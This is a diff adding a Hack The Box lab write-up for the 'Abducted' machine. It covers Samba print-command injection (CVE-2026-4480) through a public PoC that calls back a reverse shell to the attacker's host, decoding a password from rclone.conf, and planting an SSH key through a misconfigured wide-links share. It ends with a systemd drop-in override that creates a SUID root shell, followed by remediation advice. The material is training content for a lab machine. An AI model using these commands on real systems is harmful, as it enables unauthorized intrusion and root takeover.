@@ -1,0 +1,332 @@
+export const frontmatter = {
+  title: "Hack The Box Abducted Machine Writeup",
+  slug: "hack-the-box-abducted-machine-writeup",
+  category: "HTB Machine",
+  description:
+    "Complete walkthrough of the Hack The Box Abducted machine, covering Samba RCE (CVE-2026-4480) exploitation, rclone credential extraction, lateral movement via SMB share misconfigurations, and root privilege escalation through writable Systemd drop-in directories.",
+  date: "2026-06-11",
+};
+
+export const metadata = {
+  title:
+    "HackTheBox Abducted Writeup | Samba RCE to Root via Systemd Override | loxcalhost",
+  description:
+    "Step-by-step Hack The Box Abducted writeup demonstrating exploitation of CVE-2026-4480 in Samba, decoding rclone configuration passwords, abusing wide links and force user directives for SSH access, and escalating privileges using smbd.service.d drop-in files.",
+};
+
+## Introduction
+
+This writeup details the penetration test of **Abducted**, a Linux target that highlights risks associated with vulnerable file-sharing services, credential mismanagement, and misconfigured access controls. The exploitation path involves leveraging a recent Remote Code Execution vulnerability in Samba, extracting credentials from backup configurations, abusing insecure SMB share directives to pivot between users, and ultimately escalating privileges through insecure Systemd drop-in directory permissions.
+
+## Overview
+
+The assessment begins with network enumeration, revealing an exposed Samba service. By exploiting **CVE-2026-4480**, an injection vulnerability within the Samba print spooler, initial access is established as the `nobody` user.
+
+Post-exploitation enumeration uncovers an `rclone.conf` file containing an obfuscated password. Decoding this password allows lateral movement to the user `scott` via SSH. Further system analysis identifies a misconfigured Samba share named `transfer`. This share enables insecure wide links and forces operations to execute as the user `marcus`. By creating a symbolic link within this share, an SSH public key is written directly into Marcus's home directory, granting access to his account. Finally, privilege escalation is achieved by discovering that Marcus belongs to the `operators` group, which holds write permissions over a Systemd drop-in directory for the `smbd` service. A malicious service override is created to spawn a root-owned SUID shell upon service restart.
+
+## Attack Chain
+
+- **Reconnaissance & Enumeration:** Conducted Nmap scanning to identify open ports, revealing SSH and SMB services, and utilized anonymous access to enumerate the `HP-Reception` print share.
+- **Vulnerability Identification:** Correlated the exposed Samba service with recent vulnerability disclosures, identifying it as a potential target for CVE-2026-4480.
+- **Validation & Initial Access:** Verified the injection vulnerability via an out-of-band ICMP callback, followed by executing a public Proof-of-Concept to obtain a reverse shell as the `nobody` user.
+- **Internal Enumeration & Credential Harvesting:** Searched the filesystem for backup-related configuration files and discovered an `rclone.conf` file containing an obfuscated password for a backup service account.
+- **First Lateral Movement (Scott):** Decoded the obfuscated rclone password using the built-in reveal function and successfully utilized it to authenticate via SSH as the local user `scott` due to password reuse.
+- **Misconfiguration Analysis:** Examined `/etc/samba/smb.conf` and `/etc/samba/shares.conf`, identifying that the transfer share permitted insecure wide links and forced all operations to execute within the context of the user `marcus`.
+- **Second Lateral Movement (Marcus):** Created a symbolic link targeting Marcus's home directory and accessed it over the SMB share. Leveraged the `force user` misconfiguration to write a generated SSH public key into Marcus's `authorized_keys` file, granting interactive SSH access to his account.
+- **Group Privilege Discovery:** Executed user context checks and discovered marcus was a member of the operators group, which was subsequently found to have write access to the `/etc/systemd/system/smbd.service.d` directory.
+- **Privilege Escalation (Root):** Created a malicious Systemd drop-in override file (`override.conf`) designed to copy `/bin/bas`h into the `/tmp` directory and apply the SUID bit. Restarted the Samba service to trigger the ExecStart directive as `root`, culminating in a root shell.
+
+## Setup
+
+First, download the VPN configuration file from the platform and establish a connection using OpenVPN:
+```bash
+sudo openvpn release_arena_au-release-1.ovpn
+```
+
+To confirm that the target machine is reachable across the VPN, we can send a few ICMP echo requests:
+```bash
+$ ping -c 4 10.129.102.73
+
+PING 10.129.102.73 (10.129.102.73) 56(84) bytes of data.
+64 bytes from 10.129.102.73: icmp_seq=1 ttl=63 time=421 ms
+64 bytes from 10.129.102.73: icmp_seq=2 ttl=63 time=326 ms
+64 bytes from 10.129.102.73: icmp_seq=3 ttl=63 time=321 ms
+64 bytes from 10.129.102.73: icmp_seq=4 ttl=63 time=464 ms
+
+--- 10.129.211.173 ping statistics ---
+4 packets transmitted, 4 received, 0% packet loss, time 4005ms
+rtt min/avg/max/mdev = 321.309/389.471/463.610/56.309 ms
+```
+
+## Enumeration
+
+We begin our enumeration with a port scan using Nmap to identify open ports and the services running on the target machine:
+```bash
+$ nmap -sV 10.129.102.73 
+
+Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-06 20:49 IST
+Nmap scan report for 10.129.102.73
+Host is up (0.34s latency).
+Not shown: 36776 filtered tcp ports (no-response), 28756 closed tcp ports (conn-refused)
+PORT    STATE SERVICE     VERSION
+22/tcp  open  ssh         OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
+139/tcp open  netbios-ssn Samba smbd 4
+445/tcp open  netbios-ssn Samba smbd 4
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 207.26 seconds
+```
+
+Based on the Nmap results, the target is running Ubuntu Linux and has three accessible ports:
+- **Port 22 (SSH):** OpenSSH Server
+- **Port 139 (HTTP) and Port 445:** Samba SMB	
+
+List SMB shares anonymously with:
+```bash
+$ smbclient -L //10.129.102.73 -N
+
+        Sharename       Type      Comment
+        ---------       ----      -------
+        HP-Reception    Printer   Reception printer
+        projects        Disk      Hartley Group Project Files
+        transfer        Disk      Staff file transfer
+        IPC$            IPC       IPC Service (Hartley Group Document Services)
+```
+
+Anonymous access is not permitted for the `transfer` and `projects` shares. However, anonymous access is allowed for the `HP-Reception` share.
+
+The exact Samba SMB version could not be determined; therefore, it was not possible to conclusively assess exposure to version-specific publicly disclosed CVEs. Nevertheless, further research identified **CVE-2026-4480**, a Remote Code Execution (RCE) vulnerability affecting Samba, which should be investigated further to determine whether the target system is vulnerable.
+
+## Foothold
+
+This vulnerability exists because Samba fails to properly sanitize the client-controlled job description string before passing it to the configured `print command` via the `%J` substitution parameter. An attacker can exploit this behavior to inject shell commands, resulting in Remote Code Execution (RCE).
+
+Grab the publicly available PoC for the vulnerability and use it to validate the issue:
+```bash	
+$ git clone https://github.com/TheCyberGeek/CVE-2026-4480-PoC
+$ cd CVE-2026-4480-PoC
+$ python3 exploit.py -h
+
+CVE-2026-4480 Samba print %J injection -> reverse shell
+
+positional arguments:
+  rhost                 target Samba host/IP
+  lhost                 your listener IP (e.g. tun0)
+  lport                 your listener port
+
+options:
+  -h, --help            show this help message and exit
+  -P, --printer PRINTER
+                        guest printer share name (default: HP-Reception)
+  -c, --cmd CMD         run this shell command instead of a reverse shell (LHOST/LPORT ignored)
+```
+
+Before attempting full exploitation, a low-impact validation was performed using an out-of-band (OOB) ICMP callback to confirm command execution on the target. The PoC was executed with a simple `ping` command directed at the attacker's host:
+```bash
+$ python3 exploit.py 10.129.102.73 10.10.14.45 4444 -c 'ping -c 1 10.10.14.45'
+```
+
+On the attacker's machine, `tcpdump` was used to monitor ICMP traffic. The receipt of an ICMP echo request followed by a corresponding echo reply confirmed that the command was successfully executed on the target:
+```bash
+$ sudo tcpdump -ni tun0 icmp
+
+17:38:17.853570 IP 10.129.102.73 > 10.10.14.45: ICMP echo request, id 1659, seq 1, length 64
+17:38:17.853619 IP 10.10.14.45 > 10.129.102.73: ICMP echo reply, id 1659, seq 1, length 64
+```
+
+This verified that arbitrary commands could be executed through the vulnerability before proceeding with further exploitation.
+
+After confirming command execution, a listener was started on the attacker's machine to receive an incoming reverse shell:
+```bash
+$ nc -lvnp 4444
+```
+
+The vulnerability was then exploited using the PoC, resulting in a reverse shell connection back to the listener:
+```bash
+$ python3 exploit.py 10.129.102.73 10.10.14.45 4444
+```
+
+Once the payload was executed, the target system initiated a connection to the attacker's host, providing interactive shell access:
+```bash
+$ nobody@abducted:/var/spool/samba$ id
+
+uid=65534(nobody) gid=65534(nogroup) groups=65534(nogroup)
+```
+
+## Lateral Movement
+
+To identify potentially interesting configuration files, a search was performed across the filesystem. Since a generic search for configuration files produced a large amount of output, the results were filtered for backup-related files:
+```bash
+$ find / -name "*.conf" 2>/dev/null | grep backup
+
+/opt/offsite-backup/rclone.conf
+```
+
+Inspecting the file revealed an `rclone` configuration containing credentials for an offsite backup service:
+```bash
+$ cat /opt/offsite-backup/rclone.conf
+
+[offsite]
+type = sftp
+host = backup.hartley-group.internal
+user = svc-backup
+pass = HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
+shell_type = unix
+```
+
+The `pass` field in `rclone` configurations is not encrypted; instead, it is obfuscated using a reversible encoding mechanism. The stored value can be recovered using the built-in `rclone reveal` functionality:
+```bash
+$ rclone reveal HZKAxfnMj-nLm59X9gpcC2ohjQL-WqVT6yRsNw
+iXzvcib3SrpZ
+```
+
+Since the usernames `scott` and `marcus` had previously been identified on the system, the recovered credential was tested for password reuse. The password was found to be valid for the `scott` account, providing access to a legitimate user context via SSH:
+```bash
+$ ssh scott@10.129.102.73
+
+scott@abducted:~$ id
+uid=1000(scott) gid=1001(scott) groups=1001(scott)
+
+scott@abducted:~$ cat user.txt
+▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
+```
+
+## Further Lateral Movement
+
+Next, the Samba configuration files located under `/etc/samba` were examined:
+
+```bash
+scott@abducted:~$ cat /etc/samba/smb.conf
+[global]
+   workgroup = WORKGROUP
+   server string = Hartley Group Document Services
+   netbios name = ABDUCTED
+   map to guest = Bad User
+   guest account = nobody
+   security = user
+   printing = sysv
+   load printers = no
+   disable spoolss = no
+   unix extensions = no
+   allow insecure wide links = yes
+   log level = 0
+   include = /etc/samba/shares.conf
+```
+
+```bash
+scott@abducted:~$ cat /etc/samba/shares.conf
+...<SNIP>...
+[transfer]
+   comment = Staff file transfer
+   path = /srv/transfer
+   valid users = scott
+   force user = marcus
+   read only = no
+   wide links = yes
+   browseable = yes
+```
+
+The `transfer` share contains a particularly interesting configuration. While access to the share is restricted to the user `scott`, the directive `force user = marcus` causes all file operations performed through the share to be executed with the privileges of the `marcus` account, regardless of the authenticated user.
+
+Additionally, the share enables `wide links = yes`, and the global configuration specifies both `unix extensions = no` and `allow insecure wide links = yes`. This combination permits Samba to follow symbolic links that point outside of the shared directory tree.
+
+As a result, any files accessed through such symbolic links would be handled using the permissions of the `marcus` account. This creates an opportunity to access files outside the intended share boundaries and potentially interact with resources that would otherwise only be available to `marcus`.
+
+This configuration can be leveraged by creating a symbolic link within the `transfer` share that points to files in `marcus`'s home directory. Because `wide links` is enabled, Samba will follow the symlink outside of the shared directory, and due to `force user = marcus`, all file operations performed through the share will be executed with the privileges of the `marcus` account. As a result, it becomes possible to write an SSH public key to `~marcus/.ssh/authorized_keys`, ultimately allowing authentication as `marcus` via SSH.
+
+An SSH key pair was then generated for authentication:
+```
+scott@abducted:~$ ln -s /home/marcus/ /srv/transfer/marcus_home
+
+$ ssh-keygen -t ed25519 -f key
+```
+
+Next, the transfer share was accessed over SMB using Scott's credentials. The symbolic link exposed Marcus's home directory through the share, allowing navigation to the target location. A .ssh directory was created, and the attacker's public key was uploaded as authorized_keys:
+```
+$ smbclient //10.129.102.73/transfer -U scott%iXzvcib3SrpZ
+
+$ cd marcus_home
+
+$ mkdir .ssh
+
+$ cd .ssh
+
+$ put key.pub authorized_keys
+putting file key.pub as \marcus_home\.ssh\authorized_keys (0.1 kb/s) (average 0.1 kb/s)
+
+$ exit
+```
+
+Because the share was configured with `force user = marcus`, all file operations were performed with Marcus's privileges. As a result, the uploaded public key was written as Marcus, enabling SSH key-based authentication to his account.
+
+A new SSH session was then established using the generated private key:
+```
+$ ssh -i key marcus@10.129.102.73
+
+marcus@abducted:~$ id
+uid=1001(marcus) gid=1002(marcus) groups=1002(marcus),1000(operators)
+```
+
+## Privilege Escalation
+
+The `id` output revealed that `marcus` is a member of the `operators` group. To identify potentially interesting files or directories associated with this group, a search was performed across the filesystem:
+```bash 
+$ find / -group operators 2>/dev/null
+
+/etc/systemd/system/smbd.service.d
+```
+
+The discovered directory is a Systemd drop-in location for the Samba service. Any `*.conf` file placed within `/etc/systemd/system/smbd.service.d/` is automatically merged into the `smbd.service` configuration when Systemd reloads the unit. These drop-in files can be used to override or extend service settings, including directives such as `ExecStartPre=`, which are executed before the main service process starts.
+
+Since the Samba daemon (`smbd`) runs with root privileges, commands specified within a malicious drop-in configuration would also execute as root when the service is started or restarted. Consequently, write access to this directory presents a path to arbitrary command execution with root privileges, representing a potential privilege escalation vector.
+
+To exploit the writable Systemd drop-in directory, an override configuration was created at `/etc/systemd/system/smbd.service.d/override.conf`:
+```ini 
+[Service]
+Type=oneshot
+ExecStart=
+ExecStart=/bin/bash -c "cp /bin/bash /tmp/rootbash && chmod +xs /tmp/rootbash"
+```
+
+The modified service configuration was then loaded and the Samba service restarted:
+```bash id="uklj3q"
+marcus@abducted:~$ systemctl daemon-reload
+marcus@abducted:~$ systemctl restart smbd
+```
+
+Upon restarting the service, the `ExecStart` directive executed with root privileges, creating a SUID-enabled copy of `bash` at `/tmp/rootbash`. Executing the binary with the `-p` flag spawned a shell with effective root privileges:
+```bash 
+marcus@abducted:~$ /tmp/rootbash -p
+
+rootbash-5.2# id
+uid=1001(marcus) gid=1002(marcus) euid=0(root) egid=0(root) groups=0(root),1000(operators),1002(marcus)
+```
+
+With root access obtained, the root flag was retrieved:
+```bash
+rootbash-5.2# cat /root/root.txt
+▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
+```
+
+## Remediation & Recommendations
+
+- **Patch Management:** Immediately update Samba to a patched version to mitigate CVE-2026-4480. Ensure a regular patching cadence is established for all public-facing services.
+- **Secure Credential Storage:** Avoid storing credentials in plain text or weakly obfuscated formats within configuration files. Utilize dedicated secret management solutions or encrypt configuration files where supported.
+- **Harden Samba Configurations:** Remove the `allow insecure wide links = yes` directive from the global Samba configuration. Additionally, review the necessity of the `force user` directive on the `transfer` share to prevent users from bypassing intended access controls.
+- **Restrict Systemd Directory Permissions:** Remove write access for the `operators` group on `/etc/systemd/system/smbd.service.d`. Critical system and service configuration directories must be strictly owned and writable only by the `root` user.
+
+## MITRE ATT&CK Mapping
+
+- **Initial Access:** Exploit Public-Facing Application (T1190) — Exploited CVE-2026-4480 in Samba.
+- **Execution:** Command and Scripting Interpreter: Unix Shell (T1059.004) — Executed reverse shell payload via Samba injection.
+- **Credential Access:** Credentials In Files (T1552.001) — Extracted obfuscated password from `rclone.conf`.
+- **Lateral Movement:** Remote Services: SSH (T1021.004) — Authenticated as `scott` and `marcus` using obtained credentials and keys.
+- **Lateral Movement:** Remote Services: SMB/Windows Admin Shares (T1021.002) — Abused the `transfer` SMB share to place an SSH key.
+- **Privilege Escalation:** Create or Modify System Process: Systemd Service (T1543.002) — Wrote an override configuration to the `smbd` systemd drop-in directory.
+
+
+
+
+
+
